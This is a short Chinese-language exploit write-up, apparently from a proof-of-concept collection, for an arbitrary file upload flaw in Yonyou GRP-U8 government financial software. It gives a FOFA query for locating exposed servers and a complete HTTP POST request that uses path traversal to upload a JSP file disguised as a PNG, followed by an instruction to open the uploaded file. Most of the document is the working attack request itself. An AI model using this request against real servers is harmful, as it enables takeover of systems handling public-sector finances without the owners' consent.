## 0x00 漏洞介绍

    用友GRP-U8R10行政事业财务管理软件是用友公司专注于电子政务事业，基于云计算技术所推出的新一代产品，是我国行政事业财务领域专业的财务管理软件。用友 GRP-U8 U8AppProxy接口存在任意文件上传漏洞，攻击者通过漏洞可以获取服务器权限。
    
## 0x01 漏洞复现

   FOFA搜索title="用友GRP-U8行政事业内控管理软件"
   
   上传londly到跟目录
   
   ```
   POST /U8AppProxy?gnid=myinfo&id=saveheader&zydm=../../hello_U8 HTTP/1.1
Host: {{Hostname}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Cookie: JSESSIONID=635F2271089E7A7E66F3F84824553DEE
Upgrade-Insecure-Requests: 1
If-Modified-Since: Mon, 01 Feb 2016 08:01:00 GMT
If-None-Match: W/"5732-1454313660000"
Content-Type: multipart/form-data; boundary=59229605f98b8cf290a7b8908b34616b
Accept-Encoding: gzip
Content-Length: 194

--59229605f98b8cf290a7b8908b34616b
Content-Disposition: form-data; name="file"; filename="londly.jsp"
Content-Type: image/png

<% out.println("0xold");%>
--59229605f98b8cf290a7b8908b34616b--
   ```
   
访问 http://xxxxxxxxxxxx/londly.jsp  

0x02 批量脚本给自己留哥作业，有时间再写
   
